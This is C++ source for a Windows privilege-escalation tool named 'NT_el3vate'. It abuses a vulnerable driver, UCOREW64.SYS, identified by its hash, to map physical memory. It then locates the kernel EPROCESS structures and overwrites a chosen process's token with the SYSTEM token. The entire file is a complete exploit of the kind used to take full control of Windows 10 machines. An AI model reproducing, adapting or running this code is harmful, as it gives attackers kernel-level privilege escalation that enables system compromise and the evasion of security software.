#pragma comment(lib, "ntdll.lib") // link "ntdll.lib" for NtQuerySystemInformation()
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <string>
#include <vector>
#include <chrono>

#include "rw_primitive.h"
#include "windows_helper_functions.h"


// Those offsets are for Windows 10 21H2
unsigned __int64 _EPROCESS_ImageFileName_offset = 0;
unsigned __int64 _EPROCESS_UniqueProcessId_offset = 0;
unsigned __int64 _EPROCESS_Token_offset = 0;

void printBytes(void* ptr, int size)
{
	unsigned char* p = (unsigned char*)ptr;
	for (int i = 0; i < size; i++) {
		printf("%02hhX ", p[i]);
	}
	printf("\n");
}

int main(int argc, char** argv)
{

	if (argc < 2) {
		fprintf(stderr,"Usage: .\\NT_el3vate.exe <processID / processName> \n");
		system("pause");
		return EXIT_FAILURE;
	}

	int argcW;
	LPWSTR* argvW = CommandLineToArgvW(GetCommandLineW(), &argcW);

	std::string procName = argv[1];
	DWORD procId = 0;

	std::cout << "[ ] Get procId and procName..." << std::endl;

	// detect if process name is used instead of processID
	if (procName.find(".exe") != std::string::npos)
	{
		PROCESSENTRY32 entry;
		// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
		// If you do not initialize dwSize, Process32First fails.
		entry.dwSize = sizeof(PROCESSENTRY32);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

		if (Process32First(snapshot, &entry) == TRUE)
		{
			while (Process32Next(snapshot, &entry) == TRUE)
			{
				if (wcscmp((wchar_t *)entry.szExeFile, argvW[1]) == 0)
				{
					procId = entry.th32ProcessID;
				}
			}
		}
		// very importent to close the handle
		CloseHandle(snapshot);
		if (procId == 0) {
			std::cout << "[-] Could not find process: " << argv[1] << std::endl;
			return 1;
		}
	}
	else
	{
		procId = std::stol(argvW[1]);
	}

	printf("[+] Got procId and procName:\n");
	printf("    |- procId: %d\n ", procId);
	printf("   |- procName: %s\n", procName.c_str());

	// measure execution time of program
	auto start = std::chrono::high_resolution_clock::now();

	if (GetWindowsOffsets() == -1) {
		fprintf(stderr, "[!] GetWindowsOffsets() failed");
		return EXIT_FAILURE;
	}

	HANDLE device = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;

	DWORD bytesReturned = 0;
	
	SetConsoleTitleA("NT_el3vate");

	device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "> Could not open device 'ucorew64': 0x%lX\n", GetLastError());
		fprintf(stderr, "> Driver 'UCOREW64.SYS' SHA-256: a7c8f4faf3cbb088cac7753d81f8ec4c38ccb97cd9da817741f49272e8d01200 not found\n");
		return EXIT_FAILURE;
	}
	HANDLE hPhysicalMemory = (HANDLE)calloc(1, sizeof(HANDLE));
	if (hPhysicalMemory == NULL) {
		fprintf(stderr, "[!] calloc() failed");
		return EXIT_FAILURE;
	}
	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, hPhysicalMemory, sizeof(hPhysicalMemory),
		hPhysicalMemory, sizeof(hPhysicalMemory), &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %lX\n", status);
		return EXIT_FAILURE;
	}
	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	printf("[+] Handle to PhysicalMemory: 0x%p\n", hPhysicalMemory);
	PVOID* buf = (PVOID*)malloc(0x1000);
	if (buf == 0) {
		exit(EXIT_FAILURE);
	}
	int EPROCESS_SYSTEM_size = 0;
	int EPROCESS_target_size = 0;
	const int bufferSize = 50;

	unsigned __int64 EPROCESS_SYSTEM[bufferSize]; // 50 should be enough
	unsigned __int64 EPROCESS_target[bufferSize];


	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
	int res = GetTwoEPROCESSPhysicalBase("System" ,procName.c_str(), 4, procId, hPhysicalMemory, EPROCESS_SYSTEM, EPROCESS_target, &EPROCESS_SYSTEM_size, &EPROCESS_target_size, bufferSize);
	if (res == -1)
	{
		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
	}

	unsigned __int64 systemToken = 0;

	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
			return -1;
		}

		// print Token for each EPROCESS Base
		PVOID castedBuf = *buf;
		castedBuf = (unsigned char*)castedBuf + (EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
		printf("[+] System Token found: %p\n", (void*)*(unsigned __int64*)castedBuf);
		systemToken = *(unsigned __int64*)castedBuf;
		if (UnmapPhysicalMemory(buf) == FALSE) {
			printf("UnmapPhysicalMemory failed\n");
			return -1;
		}
	}

	for (size_t i = 0; i < EPROCESS_target_size; i++) {
		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_target[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
			return -1;
		}

		// print Token for each EPROCESS Base
		PVOID castedBuf = *buf;
		castedBuf = (unsigned char*)castedBuf + (EPROCESS_target[i] & (unsigned __int64)-1 & 0xFFF);
		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
		*(unsigned __int64*)castedBuf = systemToken; // this should do it
		
		if (UnmapPhysicalMemory(buf) == FALSE) {
			printf("UnmapPhysicalMemory failed\n");
			return -1;
		}
	}
	printf("[+] Replaced %s Token with System Token\n", procName.c_str());
	
	free(buf);
	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
	CloseHandle(device);
	auto stop = std::chrono::high_resolution_clock::now();
	auto duration = std::chrono::duration_cast<std::chrono::seconds>(stop - start);
	printf("Duration to execute the Program in seconds: %lld\n", duration.count());

	return EXIT_SUCCESS;
}